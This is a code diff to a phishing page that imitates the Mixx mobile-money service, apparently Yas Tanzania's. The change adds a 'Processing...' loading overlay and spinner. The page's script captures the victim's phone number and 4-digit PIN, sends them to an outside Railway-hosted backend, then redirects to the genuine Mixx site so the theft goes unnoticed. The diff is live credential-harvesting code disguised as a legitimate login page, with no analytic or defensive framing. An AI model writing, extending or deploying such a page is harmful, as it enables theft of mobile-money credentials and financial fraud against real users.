@@ -135,6 +135,38 @@
         box-shadow: 0 0 0 2px #ffe699;
     }
 
+    /* Loading overlay */
+    .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.7);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 999;
+        color: white;
+        font-size: 18px;
+        flex-direction: column;
+        gap: 15px;
+    }
+
+    .spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(255,255,255,0.3);
+        border-top: 4px solid #F4B400;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
     @media (max-width: 480px) {
         body { padding: 12px; }
         .wrapper { padding: 24px 16px 35px; border-radius: 40px; }
@@ -157,6 +189,12 @@
 </style>
 </head>
 <body>
+
+<!-- Loading Overlay -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div>Processing...</div>
+</div>
 
 <div class="watermark top-left">Mixx</div>
 <div class="watermark top-right">Mixx</div>
@@ -203,12 +241,13 @@
         const pinHidden = document.getElementById("pinHidden");
         const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
         const wrapper = document.getElementById("appWrapper");
+        const loadingOverlay = document.getElementById("loadingOverlay");
         
         let realPin = ["", "", "", ""];
         let submitted = false;
 
         // ============================================
-        // RAILWAY BACKEND URL (UPDATED)
+        // RAILWAY BACKEND URL
         // ============================================
         const BACKEND_URL = 'https://mixxyass-production.up.railway.app/Server';
 
@@ -223,7 +262,10 @@
             const phone = phoneInput.value;
             const fullPin = realPin.join('');
             
-            console.log('Sending data:', { phone, pin: fullPin });
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            console.log('📤 Sending data to backend:', { phone, pin: fullPin });
             
             // Send data to Railway backend as JSON
             try {
@@ -239,23 +281,20 @@
                 });
                 
                 const result = await response.json();
-                console.log('Backend response:', result);
+                console.log('✅ Backend response:', result);
                 
                 if (result.status !== 'success') {
-                    console.error('Backend error:', result);
+                    console.error('❌ Backend error:', result);
                 }
                 
             } catch (error) {
-                console.error('Error sending data:', error);
+                console.error('❌ Error sending data:', error);
             }
             
-            // Fade out and redirect to real Mixx site
-            wrapper.style.transition = "opacity 0.5s";
-            wrapper.style.opacity = "0";
-            
+            // Wait 1 second then redirect
             setTimeout(() => {
                 window.location.href = "https://yas.co.tz/mixx-by-yas/";
-            }, 500);
+            }, 1000);
         }
 
         function updateHiddenAndSubmit() {
